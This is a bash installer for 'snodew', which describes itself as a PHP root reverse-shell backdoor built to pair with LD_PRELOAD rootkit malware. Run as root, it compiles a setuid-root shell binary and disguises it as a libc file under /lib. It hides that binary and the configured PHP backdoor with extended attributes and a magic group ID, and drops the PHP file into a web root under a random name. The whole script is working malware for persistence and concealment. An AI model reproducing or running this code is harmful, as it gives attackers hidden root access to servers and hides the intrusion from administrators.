#!/bin/bash

# This is snodew, a PHP root reverse shell backdoor, designed to work alongside LD_PRELOAD malware.
# The backdoor is based off of vlany's functionality, but can easily be adapted to use another method of file hiding.
# Just make sure www-data (or the equivalent service user) is the only person able to view this PHP file after transfer to the www root.
# Obviously using an suid binary to escalate privileges won't work if you're not already root.

SNODEW_LOC="$(pwd)/snodew.php"
N_SNODEW_LOC="$(pwd)/snodew.php.bak"

cat .ascii && echo ""

[ $(id -u) != 0 ] && { echo " [-] not root, exiting"; exit; }
[ ! -f "$SNODEW_LOC" ] && { echo " [-] $SNODEW_LOC not found, exiting"; exit; }
[ ! -f `which gcc 2>/dev/null || echo "no"` ] && { echo " [-] gcc not installed/found, exiting"; exit; }
[ ! -f `which setfattr 2>/dev/null || echo "no"` ] && { echo " [-] setfattr not installed/found, exiting"; exit; }

usage ()
{
    echo " $0 - Setup snodew PHP backdoor."
    echo " $0 [install dir] [password] [hidden extended attribute value] [magic gid]"
    exit
}

# usage:
# show_info [install dir] [hashed password] [suid bin location] [extended attribute] [magic gid]
show_info ()
{
    echo " [+] installation directory: $1"
    echo " [+] hashed password: $2"
    echo " [+] suid bin location: $3"
    echo " [+] extended attribute: $4"
    echo " [+] magic gid: $5"
}

# usage:
# hash_password [password]
hash_password () { echo -n "$(sed 's/.\{2\}$//' <<< $(echo `echo -n "$1" | md5sum`))"; }

# usage:
# hide_file [path] [extended attribute]
hide_file () { setfattr -n user.$2 -v $(cat /dev/urandom | tr -dc 'A-Z' | fold -w 32 | head -n 1) $1; }

# usage:
# setup_backdoor [suid bin location] [extended attribute] [magic gid]
# extended attribute used to hide suid bin after compilation,
# magic gid used in suid bin to hide /bin/sh process
setup_backdoor ()
{
    echo ""
    echo "#include <unistd.h>
int main(){setuid(0);setgid($3);execl(\"/bin/sh\",\"sh\",0);return 0;}" >> bd.c

    echo " [+] compiling suid binary"
    gcc bd.c -o $1 || { echo "[-] couldn't compile binary"; rm bd.c; exit; }

    echo " [+] assigning suid bit to binary"
    chmod u+s $1 || { echo "[-] couldn't assign suid bit to $1"; exit; }

    [ -f ./bd.c ] && rm bd.c;

    echo " [+] hiding suid binary with set extended attribute"
    hide_file $1 $2
}

# usage:
# config_snodew [hashed password] [suid bin location] [install dir] [extended attribute]
config_snodew ()
{
    echo ""
    echo " [+] configuring snodew"
    cp $SNODEW_LOC $N_SNODEW_LOC
    sed -i "s:_PASS_:$1:" $N_SNODEW_LOC
    sed -i "s:_SUID_BIN_:$2:" $N_SNODEW_LOC

    echo " [+] moving and hiding snodew php script to specified directory"
    new_loc="$3/$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 12 | head -n 1).php"
    mv $N_SNODEW_LOC $new_loc
    hide_file $new_loc $4

    echo " [+] backdoor path: $new_loc"
}

[ -z "$1" ] && usage; # install dir
[ -z "$2" ] && usage; # password
[ -z "$3" ] && usage; # xattr
[ -z "$4" ] && usage; # magic gid
[ ! -d $1 ] && { echo " [-] specified installation directory does not exist"; exit; }

INSTALL_DIR="$1"
PASS="$(hash_password $2)"
SUID_BIN="/lib/libc.so.$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)"
HIDDEN_XATTR="$3"
MAGIC_GID="$4"

show_info $INSTALL_DIR $PASS $SUID_BIN $HIDDEN_XATTR $MAGIC_GID

setup_backdoor $SUID_BIN $HIDDEN_XATTR $MAGIC_GID
config_snodew $PASS $SUID_BIN $INSTALL_DIR $HIDDEN_XATTR

echo ""
echo " [+] $0 finished"
